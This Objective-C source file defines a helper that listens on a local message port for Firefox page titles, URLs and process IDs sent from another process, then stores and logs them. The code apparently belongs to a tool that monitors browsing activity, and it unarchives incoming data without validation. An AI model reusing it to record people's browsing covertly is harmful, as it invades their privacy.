//
//  FirefoxPageHelper.m
//  blbld
//
//  Created by Makara Khloth on 11/15/16.
//
//

#import "FirefoxPageHelper.h"

static FirefoxPageHelper *_FirefoxPageHelper = nil;

@implementation FirefoxPageHelper

@synthesize mCurrentTitle, mCurrentUrl, mPID, mMessagePort;

+ (instancetype) sharedHelper {
    if (_FirefoxPageHelper == nil) {
        _FirefoxPageHelper = [[FirefoxPageHelper alloc] init];
        
        MessagePortIPCReader *messagePort = [[MessagePortIPCReader alloc] initWithPortName:@"FirefoxPageMsgPort" withMessagePortIPCDelegate:_FirefoxPageHelper];
        [messagePort start];
        _FirefoxPageHelper.mMessagePort = messagePort;
        [messagePort release];
    }
    return _FirefoxPageHelper;
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
    if (aRawData) {
        NSDictionary *userInfo = [NSUnarchiver unarchiveObjectWithData:aRawData];
        self.mCurrentTitle = userInfo[@"title"];
        self.mCurrentUrl = userInfo[@"url"];
        self.mPID = [(userInfo[@"pid"]) intValue];
        DLog(@"Current title : %@", self.mCurrentTitle);
        DLog(@"Current url : %@", self.mCurrentUrl);
        DLog(@"Current Firefox PID : %d", self.mPID);
    }
}

- (void) dealloc {
    self.mCurrentTitle = nil;
    self.mCurrentUrl = nil;
    self.mMessagePort = nil;
    [super dealloc];
}

@end
